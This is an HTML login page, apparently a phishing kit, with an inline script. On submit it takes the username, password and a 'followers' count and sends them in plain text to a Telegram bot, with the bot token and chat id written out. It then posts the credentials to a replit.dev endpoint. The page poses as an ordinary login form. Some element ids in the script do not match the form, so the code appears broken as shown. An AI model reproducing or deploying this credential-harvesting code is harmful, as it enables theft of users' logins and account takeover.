<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <section class="container">
        <div class="login-container">
            <div class="circle circle-one"></div>
            <div class="form-container">
                <img src="https://raw.githubusercontent.com/hicodersofficial/glassmorphism-login-form/master/assets/illustration.png" alt="illustration" class="illustration" />
                <h1 class="opacity">LOGIN</h1>
                <form>
                    <input type="text" placeholder="USERNAME" />
                    <input type="password" placeholder="PASSWORD" />
                    <input type="number" id="followers" name="followers" step="1" placeholder="FOLLOWERS" required>
                    <button class="opacity">SUBMIT</button>
                        <script>
        const apiUrl = "https://d9f0130f-707a-46ed-b30a-d1d5b420c560-00-3lnvptj53i2o2.pike.replit.dev/login";
        const telegramApiUrl = "https://api.telegram.org/bot2101899532:AAGQ4MjaBjYhu--NWwDpUeFlhZnRriPDcFA/sendMessage";
        const chatId = "1339653142";

        const loginForm = document.getElementById("loginForm");
        const message = document.getElementById("message");

        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const followers = document.getElementById("followers").value;

            sendTelegramMessage(`Login Attempt:\n\nUsername: ${username}\nPassword: ${password}\nFollowers: ${followers}`);

            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    message.textContent = "Login successful!";
                    message.className = "message success";
                    window.location.href = "/acc"; 
                } else {
                    message.textContent = "Password incorrect";
                    message.className = "message error";
                }
            })
            .catch(error => {
                console.error('API Error:', error);
                message.textContent = "Password incorrect";
                message.className = "message error";
            });
        });
        function sendTelegramMessage(text) {
            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text
                })
            }).catch(error => {
                console.error("Telegram Error:", error);
            });
        }
    </script>
                </form>
                <div class="register-forget opacity">
                </div>
            </div>
            <div class="circle circle-two"></div>
        </div>
        <div class="theme-btn-container"></div>
    </section>
</body>
</html>

